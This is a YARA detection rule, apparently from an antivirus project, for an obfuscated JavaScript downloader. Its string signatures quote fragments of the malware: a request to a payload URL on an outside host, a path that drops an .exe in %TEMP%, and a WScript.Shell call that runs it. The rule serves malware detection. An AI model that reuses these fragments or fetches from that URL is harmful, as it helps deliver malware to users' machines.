rule sig_20160328_a3f6edf503b432ff7e72c7423bccf007 {
  meta:
    description = "datamaliciousorder - file 20160328_a3f6edf503b432ff7e72c7423bccf007.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a167dbe03ad2cef32449b852def2d3ee5dd0b59260b0c044913c4a68f335bf72"

  strings:
    $s1  = "function Vyxjjvu() {return Mqpsvgvmr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"brNsx6pnoP0O9x.exe\";};" fullword ascii
    $s2  = "do {WScript[Cbjqveiwwi](Tlsjdtgw() * 11)} while (Xqylty[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Mqpsvgvmr = function Coesfpv() {return WScript[Lpuhehr](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Xqylty[Tqlzhi](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s5  = "function Ehubusofk(Opdhf, Oogppbkgv){return Opdhf - Oogppbkgv;};" fullword ascii
    $s6  = "function Iydoftzr() {return ((Srgjll == true) && (Srgjll == Fnfndtg)) ? 1 : Fmecvhoxz;};" fullword ascii
    $s7  = "function Begizzf(Pexoby){Mqpsvgvmr[\"Run\"](Pexoby, Fmecvhoxz, Fmecvhoxz);};" fullword ascii
    $s8  = "function Uedqcjphf(Ubanwxdg) {var Ohjjez = (1, 2, 3, 4, 5, Ubanwxdg); return Ohjjez;};" fullword ascii
    $s9  = "return Ehubusofk(Mcehx, Hhjgn);" fullword ascii
    $s10 = "function Ulvjd()" fullword ascii
    $s11 = "function Tlsjdtgw(){return 22;};" fullword ascii
    $s12 = "var Fnfndtg = false;" fullword ascii
    $s13 = "var Srgjll = false;" fullword ascii
    $s14 = "function Hzmqmpcqr(){return Mmfypjp;};" fullword ascii
    $s15 = "var Ihjhgb = false;" fullword ascii
    $s16 = "Srgjll = true; " fullword ascii
    $s17 = "function Baevywqxdj(){return Lpuhehr;};" fullword ascii
    $s18 = "var Qwdqdskdgl = new this[\"Date\"]();" fullword ascii
    $s19 = " while (Liotk){" fullword ascii
    $s20 = "Fnfndtg = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}